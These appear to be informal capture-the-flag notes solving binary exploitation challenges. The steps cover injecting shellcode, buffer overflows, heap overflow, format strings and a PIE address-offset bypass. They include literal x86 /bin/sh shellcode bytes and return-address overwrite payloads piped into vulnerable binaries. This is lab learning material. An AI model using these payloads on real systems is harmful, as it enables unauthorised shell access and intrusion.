handy-shellcode:
1) file vuln: it's a 32-bit binairy -> google: x86 32 linux shellcode
2) echo -e '\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x53\x89\xe1\xb0\x0b\xcd\x80' > ~/getshel
3) cat ~/getshell - | ./vuln
4) cat flag.txt

practice-run-1:
./run_this

OverFlow 0 (234 A's): ./vuln AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
AAAAAAAAAAAAAAAAAAA

OverFlow 1:
1) objdump -d vuln
2) search for flag: 080485e6
3) reverse because little endian: \xe6\x85\x04\x08
4) run (64 A's & 4 B,C,D,E,F's): cat <(echo -e 'AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAABBBBCCCCDDDDEEEEFFFF\xe6\x85\x04\x08') - | ./vuln
5) gives: 0x45454545 -> python -> chr(0x45454545): EEEE so remove E's and F's
6) cat <(echo -e 'AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAABBBBCCCCDDDD\xe6\x85\x04\x08') - | ./vuln

seed-sPRiNG:
PRNG = Psuedo Random Number Generator.
It uses time(0) as the seed. So run a program that does the same and pipe to nc.

heap 0:
connect to the netcat session
choose 2 to write to buffer
just add a long string like AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
choose 4 to print flag

format string 0:
In c you can use printf( "%s\n%s", "Some text here", "more text") to format your text. This however can break when "Some text" uses '%' signes.
Give Patrick the Gr%114d_Cheese to see weirdness starting to happen. Spongebob breaks with Cla%sic_Che%s%steak.

PIE Time:
Download the vuln file and run checksec --file=./vuln
This shows that PIE (Position-Independent Executable) is enabled. This means that the code executes regardless of the address. this is to prevent overlap.
When we look at the source code in vuln.c we can see a function called win().
Let's run it inside GDB. gdb ./vuln
Now use 'r' to run it. A standard overflow with all A's doesn't work because of the PIE.
But we get the address of main().
Let's check with "disassemble main". Here we see that the start (endbr64) is at the same address as prompted.
Now we check the start of win() with "disassemble win"
In python we do address_main-address_win to get 150
We run vuln a couple of times to check if we get 150 every time and we do.
So now we run the remote nc and replace the address into our script: hex(address_main-150)
Paste the result to get the flag.